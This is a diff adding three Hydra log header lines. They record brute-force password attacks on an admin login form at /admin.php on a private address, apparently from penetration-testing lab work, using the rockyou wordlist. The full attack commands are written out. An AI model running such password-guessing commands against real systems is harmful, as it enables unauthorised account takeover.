@@ -1,0 +1,3 @@
+# Hydra v9.4 run at 2024-04-23 13:54:11 on 10.129.118.0 http-post-form (hydra -l admin -P /usr/share/wordlists/rockyou.txt -v -o hydra.txt 10.129.118.0 http-post-form /admin.php:username=^USER^&password=^PASS^:F=Wrong)
+# Hydra v9.4 run at 2024-04-23 13:54:40 on 10.129.118.0 http-post-form (hydra -l admin -P /usr/share/wordlists/rockyou.txt -vvv -o hydra.txt -I 10.129.118.0 http-post-form /admin.php:username=^USER^&password=^PASS^:F=Wrong)
+# Hydra v9.4 run at 2024-04-23 13:54:50 on 10.129.118.0 http-post-form (hydra -l admin -P /usr/share/wordlists/rockyou.txt -o hydra.txt -I 10.129.118.0 http-post-form /admin.php:username=^USER^&password=^PASS^:F=Wrong)
